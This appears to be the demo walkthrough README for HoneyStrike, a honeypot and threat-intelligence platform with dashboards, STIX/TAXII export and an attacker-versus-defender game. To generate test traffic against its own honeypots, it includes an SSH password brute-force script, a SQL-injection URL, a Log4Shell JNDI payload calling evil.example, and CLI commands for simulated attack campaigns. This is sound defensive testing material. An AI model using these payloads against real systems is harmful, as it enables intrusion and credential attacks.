# HoneyStrike — 5-minute demo

A guided walkthrough of every visible feature, runnable against the dev stack on your laptop. Assumes you already have `docker compose -f docker-compose.dev.yml up -d` running and `python -m honeystrike.api.bootstrap` has created the admin user.

> Everything below uses the dev defaults (admin / change-me-strong-password, ports `2222 / 18080 / 2221 / 33389 / 8443 / 8001`). Production uses Caddy on `:443` so paths are identical except for the host.

---

## 1. Sign in

Open **http://localhost:8001/login** in a browser. Default credentials:

| Field | Value |
|---|---|
| Username | `admin` |
| Password | `change-me-strong-password` |

You land on the live attack map. The four overview tiles in the header light up the moment a session closes — they read from `/api/stats/overview?days=1`.

---

## 2. Generate attacker traffic

Open a terminal and fire one probe per service. Each one produces a closed session, an enrichment pass, optionally an alert, and (above the threshold) a PDF report.

```bash
# SSH brute-force — multiple wordlist creds in one transport.
docker run --rm --network honey_strike_v1_honeypot-net honeystrike-dev:latest \
  python -c "
import paramiko, socket
s = socket.create_connection(('ssh-honeypot', 22), 10)
t = paramiko.Transport(s); t.start_client(timeout=10)
for pw in ['root','toor','123456','password','letmein','admin']:
    try: t.auth_password('root', pw); break
    except paramiko.AuthenticationException: pass
    except paramiko.SSHException: break
t.close()
"

# HTTP — sqlmap UA + Log4Shell body to a fake admin panel.
curl -s -X POST http://localhost:18080/.env?id=1+UNION+SELECT+password+FROM+users \
  -H "User-Agent: sqlmap/1.7.8#stable" \
  -H "Content-Type: text/plain" \
  --data '${jndi:ldap://evil.example/a}' >/dev/null

# FTP — a single login attempt with breached-credential style creds.
curl -s ftp://root:toor@localhost:2221/ >/dev/null 2>&1 || true

# RDP — TPKT + X.224 CR with mstshash cookie.
docker run --rm --network honey_strike_v1_honeypot-net python:3-slim \
  python -c "
import socket, struct
s = socket.create_connection(('rdp-honeypot', 3389), 5)
cookie = b'Cookie: mstshash=DemoUser\r\n'
neg = struct.pack('<BBHI', 0x01, 0x00, 8, 0x01)
payload = cookie + neg
x224 = bytes([6+len(payload), 0xE0, 0, 0, 0, 0, 0]) + payload
s.sendall(bytes([0x03, 0x00]) + struct.pack('>H', 4+len(x224)) + x224)
import contextlib
with contextlib.suppress(socket.timeout): s.recv(4096)
s.close()
"

# TLS — handshake against the JA3 sniffer.
curl -sk --max-time 5 https://localhost:8443/ >/dev/null
```

Within 2 seconds the **Live map** sidebar fills with new rows and severity-coloured markers pulse on the map.

---

## 3. Inspect a single session

Click any row in the sidebar (or any marker on the map). The session-detail page shows:

| Panel | Source |
|---|---|
| Source IP / country / ASN | `fingerprints` row (geo from MaxMind, ASN from MaxMind, abuse from AbuseIPDB) |
| Threat score + severity | `sessions.threat_score`, `sessions.severity` (composite of abuse + tools + TTPs + privilege bonus) |
| Tool signatures | `fingerprints.tool_signatures` (Hydra, sqlmap, Masscan, etc.) |
| MITRE TTPs | `ttp_matches` (T1110.001, T1190, T1078, …) |
| Event preview | First 20 events from `events` (auth attempts, HTTP requests, RDP cookies, JA3) |
| Alerts dispatched | `alerts` rows — channels that fired |

---

## 4. Browse the sessions table

Click **Sessions** in the top nav, or hit **http://localhost:8001/sessions** directly.

Try the filters:

- `service = ssh` → only SSH sessions
- `min_score = 50` → only HIGH/CRITICAL
- a date range
- per-page = 25/50/100/200

Filter state encodes into the URL hash — copy the address bar to share a view.

---

## 5. Analytics

**http://localhost:8001/analytics**

Five Chart.js panels:

- **Timeline** — sessions + average score per hour (dual-axis line)
- **Severity breakdown** — doughnut
- **Sessions by service** — bar
- **Top MITRE techniques** — horizontal bar
- **Top source countries** — bar

Window selector: 24 h / 7 / 30 / 90 days. Bucket: hour or day.

---

## 6. Pull a report

After step 2, the HTTP and SSH sessions cleared the 60-point auto-trigger and the report-worker queued a PDF. From the detail page click **report.pdf** (or hit the API directly):

```bash
TOKEN=$(curl -s -X POST http://localhost:8001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"change-me-strong-password"}' \
  | sed 's/.*"access_token":"\([^"]*\)".*/\1/')

curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/sessions/<SESSION_ID>/report?format=pdf" \
  -o session.pdf
xdg-open session.pdf
```

To trigger one explicitly:

```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/sessions/<SESSION_ID>/report?format=pdf"
# {"report_id":"…","status":"queued","estimated_seconds":5}
```

A pre-rendered sample PDF + HTML is in [`samples/`](samples/).

---

## 7. STIX 2.1 export

For SIEM ingestion (MISP / OpenCTI / Sentinel):

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/stix/stats?days=7&min_score=60" | jq .
# Pre-flight: how many sessions / how big the bundle will be.

curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/stix/bundle?days=7&min_score=60&limit=500" \
  -o honeystrike-bundle.json
```

The bundle is a real STIX 2.1 `bundle` SDO: one `identity` SDO, one `indicator` per unique attacker IP, one `observed-data` + `sighting` per session.

---

## 8. TAXII 2.1

Same data through the TAXII collection layout:

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8001/taxii2/ | jq .
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8001/taxii2/v1/collections/ | jq .
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/taxii2/v1/collections/honeystrike-high-severity/objects/?days=7&min_score=60" \
  -o taxii-bundle.json
```

Point `taxii2-client` or the MISP TAXII module at `http://localhost:8001/taxii2/` with Bearer auth and you're ingesting.

---

## 9. ML anomaly detection (cron job)

Run the Isolation-Forest pass once interactively:

```bash
docker compose -f docker-compose.dev.yml run --rm app python -m honeystrike.workers.intel.ml_anomaly
```

Then query the result:

```sql
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c "
  SELECT s.service, s.threat_score, m.anomaly_score, m.is_anomaly
  FROM ml_anomaly_scores m JOIN sessions s ON s.id = m.session_id
  ORDER BY m.anomaly_score DESC LIMIT 10;
"
```

The session that's *most outlier-shaped against the recent baseline* gets the highest `anomaly_score`. Schedule the script hourly from cron in prod.

---

## 10. Live WebSocket feed

```bash
# In a separate terminal — wait, then fire one of the probes from step 2.
TOKEN=$(curl -s -X POST http://localhost:8001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"change-me-strong-password"}' \
  | sed 's/.*"access_token":"\([^"]*\)".*/\1/')
wscat -c "ws://localhost:8001/api/ws/live?token=$TOKEN"
```

You'll see the initial seed of the last 25 scored sessions, then new sessions stream in every ~2 seconds.

---

## What's underneath each step

For the architecture: [`docs/architecture.md`](docs/architecture.md). For deployment + operations: [`DEPLOY.md`](DEPLOY.md). For the API contract: [`docs/02_API_Contracts.md`](docs/02_API_Contracts.md). For the data model: [`docs/04_PostgreSQL_Schema.sql`](docs/04_PostgreSQL_Schema.sql).

---

## 11. The `honeystrike` CLI (Phase 6)

After `poetry install`, you have one entrypoint:

```bash
honeystrike --help
honeystrike attack list                          # see every scenario + campaign
honeystrike login                                # cache an API token
```

### Attacker mode (drive scripted attacks at any honeypot)

```bash
honeystrike attack ssh-hydra --target 127.0.0.1:2222 --intensity burst --keep-shell
honeystrike attack http-sqlmap --target 127.0.0.1:18080
honeystrike attack http-log4shell --callback ldap://evil.example/a
honeystrike attack http-recon --target 127.0.0.1:18080   # triggers canary captures
honeystrike attack multi-service --services ssh,http,ftp,tls
honeystrike attack full-compromise --target-host 127.0.0.1 --report
honeystrike attack campaign apt28 --target-host 127.0.0.1
honeystrike attack campaign fin7 | ransomware-deployer | script-kiddie
```

Every command takes `--target`, `--intensity slow|medium|burst`, `--count N`, and scenario-specific flags (see `--help` per command).

### Defender mode (investigate, narrate, label, block)

```bash
honeystrike defend recent --service ssh --limit 10
honeystrike defend show <session_id>             # narrative incident summary
honeystrike defend top-attackers --days 7
honeystrike defend top-ttps --days 30
honeystrike defend alerts --severity high
honeystrike defend tail                          # live stream (Ctrl-C)
honeystrike defend narrate --bell                # natural-language commentary
honeystrike defend flags-found                   # CTF canary captures
honeystrike defend campaign-score <campaign_id>  # grade an attack chain
honeystrike defend report <session_id> --open
honeystrike defend label <session_id> T1110.001  # block-on-correct-label
```

---

## 12. Multiplayer game mode — challenge a friend

Two players, each on their own VPS, each running their own HoneyStrike stack and the `honeystrike` CLI. A shared **lobby** (a small SQLite-backed FastAPI on port 8002, hosted by any one friend) brokers invites. A shared **Discord webhook** posts match summaries.

### Bob (defender) — keep a listener open

```bash
docker compose -f docker-compose.dev.yml up -d                    # full stack
honeystrike register --lobby https://lobby.example \
  --handle bob \
  --public-ssh bob.example:2222 \
  --public-http bob.example:18080 \
  --discord-webhook https://discord.com/api/webhooks/...
honeystrike defend listen                       # waits for invites
```

Bob's terminal stays open; incoming challenges prompt y/N. On accept, the CLI:
1. attaches to Bob's local `/api/ws/live` WebSocket
2. for each new scored session it prompts: "Label this TTP — type ID or `skip`"
3. correct labels call `POST /api/defender/block` → the attacker's IP is refused at every honeypot listener for 5 minutes
4. at match end, a per-match summary embed lands in the shared Discord channel

### Alice (attacker) — challenge Bob

```bash
honeystrike register --lobby https://lobby.example --handle alice \
  --discord-webhook https://discord.com/api/webhooks/...
honeystrike players                              # confirm bob is online
honeystrike challenge bob --scenario apt28 --duration 300
```

Alice's CLI blocks until Bob accepts, then runs the chosen scenario/campaign against Bob's registered public endpoints. Once Bob labels a TTP correctly, Alice sees `Connection refused` on subsequent attacks — that's the block firing.

### Win condition

There's **no formal scoreboard** — the game is casual. Bob "wins" by:
- detecting and labelling TTPs as they happen
- correct labels block Alice
- match summary embed in Discord shows: correct labels / total, time-to-first-block, phases fired

If Bob never labels correctly, Alice's full-compromise runs through unimpeded. If Bob nails it on the first signal, Alice gets nowhere.

### Local-only practice

Same mechanic works against a single instance. Bob can run `honeystrike defend listen` against `localhost`; Alice's CLI fires at `127.0.0.1:2222` etc. Useful for testing scenarios + label coverage without needing a friend.

### CTF canaries

The HTTP honeypot serves a fake `/.env` with an `AKIA0HONEYSTRIKECANARY` AWS access key; `/admin` has a hidden `hs-canary-token-…` HTML comment; the SSH fake-shell's `cat /etc/passwd` returns a `canary-user:x:9999` line. Any attacker who grabs these gets surfaced by `honeystrike defend flags-found` — useful both as a CTF training mechanic and as a real-world canary-token trip-wire (real attackers hitting these endpoints in production = a high-value signal).

### NAT / tunnel note

Each player needs a public IP on their VPS, or a tunnel (Tailscale, Cloudflare Tunnel for HTTP only). HoneyStrike doesn't solve NAT traversal; document your friend group's hosting setup once and re-use.
